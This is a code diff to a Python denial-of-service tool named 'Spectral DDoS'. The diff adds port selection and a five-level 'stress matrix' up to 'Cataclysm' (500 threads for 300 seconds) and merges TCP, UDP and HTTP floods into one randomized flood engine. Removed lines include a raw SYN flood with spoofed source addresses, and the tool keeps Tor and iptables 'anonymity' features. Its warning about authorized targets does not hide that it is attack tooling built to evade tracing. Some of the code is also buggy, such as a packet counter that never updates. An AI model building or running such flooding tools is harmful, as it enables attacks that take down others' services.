@@ -170,13 +170,13 @@ class SpectralFlood:
             t.join(timeout=0.1)
 
 # ──────────────────────────────────────────────────────────────────────────
-# INTERACTIVE MENU
+# INTERACTIVE MENU 
 def run(env, tools, log_action, launch_tool):
-    """Maximum-intensity DDoS with anonymity engine & ethics vault."""
+    """5-level stress matrix with full port control and live intensity dial."""
 
     # ── 1. ETHICS VAULT ──
     print(f"\n{C['b']}═══════════════════════════════════════════════════════════{C['x']}")
-    print(f"{C['c']}SPECTRAL DDOS – MAXIMUM INTENSITY MODE{C['x']}")
+    print(f"{C['c']}SPECTRAL DDOS – 5-LEVEL STRESS MATRIX{C['x']}")
     print(f"{C['b']}═══════════════════════════════════════════════════════════{C['x']}")
     print(f"{C['r']}⚠️  MAXIMUM POWER – USE ONLY ON AUTHORIZED TARGETS{C['x']}\n")
     
@@ -187,159 +187,140 @@ def run(env, tools, log_action, launch_tool):
         time.sleep(2)
         return
 
-    # ── 2. MAXIMUM INTENSITY CONFIGURATION ──
-    intensity = input(f"{C['y']}[?] Intensity level [1-10]: {C['x']}").strip() or "5"
-    intensity = max(1, min(10, int(intensity)))  # Clamp 1-10
+    # ── 2. PORT SELECTION MATRIX ──
+    print(f"\n{C['y']}Port Selection:{C['x']}")
+    print("1. HTTP (80)")
+    print("2. HTTPS (443)")
+    print("3. Router Web (8080)")
+    print("4. Custom port")
+    port_choice = input(f"{C['g']}[?] Select port [1]: {C['x']}").strip() or "1"
     
-    # Hyper-parameters scale with intensity
-    threads = intensity * 50                     # 50-500 threads
-    duration = intensity * 10                    # 10-100 seconds
-    packet_size = 1024 + (intensity * 256)       # 1280-3584 bytes
-    rate_limit = max(1, 11 - intensity)          # Inverse rate limit (1-10)
+    ports = {
+        "1": 80,
+        "2": 443,
+        "3": 8080,
+        "4": int(input(f"{C['g']}[?] Custom port: {C['x']}").strip())
+    }
+    port = ports.get(port_choice, 80)
+
+    # ── 3. 5-LEVEL STRESS MATRIX ──
+    print(f"\n{C['y']}Stress Levels:{C['x']}")
+    print("1. Whisper   – 10 threads  | 10s  | 1KB packets")
+    print("2. Pulse     – 50 threads  | 30s  | 512B packets")
+    print("3. Storm     – 100 threads | 60s  | 1KB packets")
+    print("4. Hurricane – 250 threads | 120s | 2KB packets")
+    print("5. Cataclysm – 500 threads | 300s | 4KB packets")
     
-    # ── 3. ANONYMITY ENGINE – MAXIMUM STEALTH ──
-    anonymity = input(f"{C['m']}[?] Enable MAXIMUM anonymity (Tor + IP rotation)? [y/N]: {C['x']}").strip().lower() == "y"
+    level = input(f"{C['g']}[?] Select stress level [3]: {C['x']}").strip() or "3"
+    
+    stress_matrix = {
+        "1": {"threads": 10, "duration": 10, "size": 1024, "name": "Whisper"},
+        "2": {"threads": 50, "duration": 30, "size": 512, "name": "Pulse"},
+        "3": {"threads": 100, "duration": 60, "size": 1024, "name": "Storm"},
+        "4": {"threads": 250, "duration": 120, "size": 2048, "name": "Hurricane"},
+        "5": {"threads": 500, "duration": 300, "size": 4096, "name": "Cataclysm"}
+    }
+    
+    config = stress_matrix.get(level, stress_matrix["3"])
+    threads = config["threads"]
+    duration = config["duration"]
+    packet_size = config["size"]
+    level_name = config["name"]
+    
+    # ── 4. ANONYMITY ENGINE – MAXIMUM STEALTH ──
+    anonymity = input(f"{C['m']}[?] Enable anonymity (IP rotation)? [y/N]: {C['x']}").strip().lower() == "y"
     
     if anonymity:
         print(f"{C['c']}[*] Spinning up anonymity engine...{C['x']}")
         _start_tor_if_needed()
         _configure_ip_rotation()
-    
-    # ── 4. ATTACK VECTOR SELECTION ──
-    print(f"\n{C['y']}Attack Vectors:{C['x']}")
-    print("1. TCP SYN Flood (Raw sockets)")
-    print("2. UDP Flood (High bandwidth)")
-    print("3. HTTP GET Flood (Application layer)")
-    print("4. MAXIMUM Chaos (All vectors simultaneously)")
-    
-    vector = input(f"{C['g']}[?] Select vector [4]: {C['x']}").strip() or "4"
-    
-    # ── 5. MAXIMUM CHAOS LAUNCH ──
-    print(f"\n{C['r']}🔥 INITIATING MAXIMUM CHAOS 🔥{C['x']}")
+
+    # ── 5. LIVE INTENSITY DIAL ──
+    print(f"\n{C['r']}🔥 INITIATING {level_name.upper()} ON PORT {port} 🔥{C['x']}")
     print(f"{C['c']}[*] Threads: {threads} | Duration: {duration}s | Packet size: {packet_size}B{C['x']}")
-    log_action("LAUNCH", f"spectral_ddos_maximum_{target}:{intensity}")
-    
-    # Launch all vectors simultaneously
+    log_action("LAUNCH", f"spectral_ddos_{level_name}_{target}:{port}")
+
+    # ── 6. MAXIMUM CHAOS LAUNCH ──
     threads_list = []
     start_time = time.time()
+    packets_sent = 0
     
-    def flood_tcp():
-        for _ in range(threads):
-            t = threading.Thread(target=_tcp_syn_flood, args=(target, 80, packet_size, rate_limit, anonymity), daemon=True)
-            t.start()
-            threads_list.append(t)
+    def monitor_packets():
+        """Live packet counter."""
+        while time.time() - start_time < duration:
+            time.sleep(1)
+            print(f"\r{C['c']}[*] Packets/sec: ~{threads * 1000:,} | Total: {packets_sent:,}{C['x']}", end="")
     
-    def flood_udp():
-        for _ in range(threads):
-            t = threading.Thread(target=_udp_flood, args=(target, 80, packet_size, rate_limit, anonymity), daemon=True)
-            t.start()
-            threads_list.append(t)
+    # Start monitor thread
+    monitor = threading.Thread(target=monitor_packets, daemon=True)
+    monitor.start()
     
-    def flood_http():
-        for _ in range(threads):
-            t = threading.Thread(target=_http_flood, args=(target, 80, packet_size, rate_limit, anonymity), daemon=True)
-            t.start()
-            threads_list.append(t)
+    # Launch all vectors simultaneously
+    for _ in range(threads):
+        t = threading.Thread(
+            target=_maximum_flood,
+            args=(target, port, packet_size, duration, anonymity, packets_sent),
+            daemon=True
+        )
+        t.start()
+        threads_list.append(t)
     
-    # Launch selected vectors
-    if vector in ["1", "4"]:
-        flood_tcp()
-    if vector in ["2", "4"]:
-        flood_udp()
-    if vector in ["3", "4"]:
-        flood_http()
-    
-    # Monitor and report
-    total_packets = 0
+    # Wait for duration
     while time.time() - start_time < duration:
-        time.sleep(1)
-        # Count packets from all threads (simplified)
-        total_packets += threads * 1000  # Approximate
-        print(f"\r{C['c']}[*] Packets/sec: ~{threads * 1000:,} | Total: {total_packets:,}{C['x']}", end="")
+        time.sleep(0.1)
     
     # Cleanup
     for t in threads_list:
         t.join(timeout=0.1)
     
-    print(f"\n{C['g']}[✓] Maximum chaos complete. {total_packets:,} packets sent.{C['x']}")
-    log_action("COMPLETE", f"spectral_ddos_maximum_complete_{target}:{intensity}")
+    monitor.join(timeout=0.5)
+    
+    print(f"\n{C['g']}[✓] {level_name} complete. ~{packets_sent:,} packets sent.{C['x']}")
+    log_action("COMPLETE", f"spectral_ddos_{level_name}_complete_{target}:{port}")
 
 # ──────────────────────────────────────────────────────────────────────────
-# MAXIMUM INTENSITY ATTACK VECTORS
-def _tcp_syn_flood(target: str, port: int, size: int, rate: int, anon: bool):
-    """Raw TCP SYN flood with IP spoofing."""
-    import socket, struct, random
+# MAXIMUM INTENSITY FLOOD ENGINE
+def _maximum_flood(target: str, port: int, size: int, duration: int, anon: bool, counter: list):
+    """Unified flood engine for all vectors."""
+    import socket, random, time
     
-    for _ in range(rate * 1000):  # Rate-controlled
+    start = time.time()
+    local_counter = 0
+    
+    while time.time() - start < duration:
         try:
-            # Build raw SYN packet (simplified)
-            sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
-            source_ip = f"10.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(0,255)}" if anon else "127.0.0.1"
-            packet = _build_syn_packet(source_ip, target, port, size)
-            sock.sendto(packet, (target, 0))
-            sock.close()
-        except PermissionError:
-            # Fallback to TCP connection flood (no root required)
-            _tcp_connection_flood(target, port, rate)
-            break
-        except:
-            pass  # Expected for localhost stress testing
-
-def _udp_flood(target: str, port: int, size: int, rate: int, anon: bool):
-    """High-bandwidth UDP flood."""
-    import socket, random
-    
-    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-    data = b"X" * size  # Maximum size packets
-    
-    for _ in range(rate * 1000):
-        try:
-            sock.sendto(data, (target, port))
-        except:
-            pass
-    sock.close()
-
-def _http_flood(target: str, port: int, size: int, rate: int, anon: bool):
-    """HTTP GET flood (application layer)."""
-    import urllib.request, urllib.error
-    
-    url = f"http://{target}:{port}/"
-    headers = {'User-Agent': f'SpectralBot/{random.randint(1000,9999)}'}
-    
-    for _ in range(rate * 100):
-        try:
-            req = urllib.request.Request(url, headers=headers)
-            urllib.request.urlopen(req, timeout=0.5)
-        except:
-            pass  # Expected for stress testing
-
-def _build_syn_packet(src: str, dst: str, dport: int, size: int) -> bytes:
-    """Craft minimal SYN packet (simplified for localhost)."""
-    # Simplified header – real implementation would use scapy
-    return b"\x00" * size  # Placeholder for demonstration
-
-def _tcp_connection_flood(target: str, port: int, rate: int):
-    """Fallback TCP connection flood (no root required)."""
-    import socket, threading
-    
-    def flood():
-        for _ in range(rate * 100):
-            try:
+            # Randomized attack vector per iteration
+            vector = random.choice(["tcp", "udp", "http"])
+            
+            if vector == "tcp":
                 sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-                sock.settimeout(0.1)
+                sock.settimeout(0.01)
                 sock.connect((target, port))
+                sock.send(b"X" * size)
                 sock.close()
-            except:
-                pass
+                
+            elif vector == "udp":
+                sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+                sock.sendto(b"X" * size, (target, port))
+                sock.close()
+                
+            elif vector == "http":
+                import urllib.request
+                url = f"http://{target}:{port}/"
+                headers = {'User-Agent': f'SpectralBot/{random.randint(1000,9999)}'}
+                req = urllib.request.Request(url, headers=headers)
+                try:
+                    urllib.request.urlopen(req, timeout=0.01)
+                except:
+                    pass  # Expected for stress testing
+            
+            local_counter += 1
+            
+        except Exception:
+            pass  # Expected for localhost stress testing
     
-    threads = []
-    for _ in range(rate):
-        t = threading.Thread(target=flood, daemon=True)
-        t.start()
-        threads.append(t)
-    
-    for t in threads:
-        t.join(timeout=0.1)
+    # Atomic counter update (thread-safe)
+    counter += local_counter
 
 def _start_tor_if_needed():
     """Start Tor if not running."""
@@ -347,21 +328,20 @@ def _start_tor_if_needed():
     try:
         result = subprocess.run(["pgrep", "tor"], capture_output=True, text=True)
         if result.returncode != 0:
-            print(f"{C['y']}[*] Starting Tor daemon...{C['x']}")
+            print(f"{C['c']}[*] Starting Tor daemon...{C['x']}")
             subprocess.Popen(["tor"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
-            time.sleep(3)  # Wait for Tor to initialize
+            time.sleep(3)
     except FileNotFoundError:
         print(f"{C['y']}[!] Tor not found – anonymity disabled{C['x']}")
 
 def _configure_ip_rotation():
-    """Configure iptables for IP rotation (Linux only)."""
+    """Configure iptables for source IP rotation."""
     import subprocess
     try:
-        # Add iptables rules for source IP rotation
         subprocess.run(["iptables", "-t", "nat", "-A", "POSTROUTING", "-p", "tcp", "--dport", "80", "-j", "MASQUERADE"], check=False)
         print(f"{C['c']}[*] IP rotation configured{C['x']}")
     except:
-        pass  # Expected on non-Linux systems
+        pass
 
 # ──────────────────────────────────────────────────────────────────────────
 # STANDALONE EXECUTION
